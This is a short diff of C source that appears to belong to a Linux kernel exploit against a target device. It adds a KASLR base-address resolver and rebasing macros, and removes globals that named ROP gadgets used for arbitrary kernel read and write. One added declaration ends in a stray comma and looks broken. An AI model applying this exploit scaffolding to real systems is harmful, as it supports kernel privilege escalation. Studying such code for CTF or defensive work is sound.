@@ -27,6 +27,15 @@
     exit(EXIT_FAILURE); \
 }while(0)
 
+/* kernel address resolver */
+// kernel base (text) without KASLR
+#define KBASE 0xffffffff81000000ul 
+unsigned long kern_base = KBASE; 
+unsigned long kern_heap = 0ul,
+
+#define DCL(x) ((x) - KBASE)
+#define ADR(x) ((x) + kern_base) 
+
 #define PAGESIZE 0x1000
 #define NPAGES(n) ((PAGESIZE) * (n))
 
@@ -195,11 +204,7 @@ unsigned long get_rax(void){
     return ret; 
 }
 
-int gfd; // target device fd
-unsigned long kern_base = 0ul,
-                kern_heap = 0ul,
-                    mov_adr_rdx_rsi = 0,  // mov qword [rdx], rsi ; ret ; write
-                     mov_rax_adr_rsi = 0; // mov rax, qword [rsi] ; ret ; read
+int gfd; // target device 
 
 
 __attribute__((constructor)) 
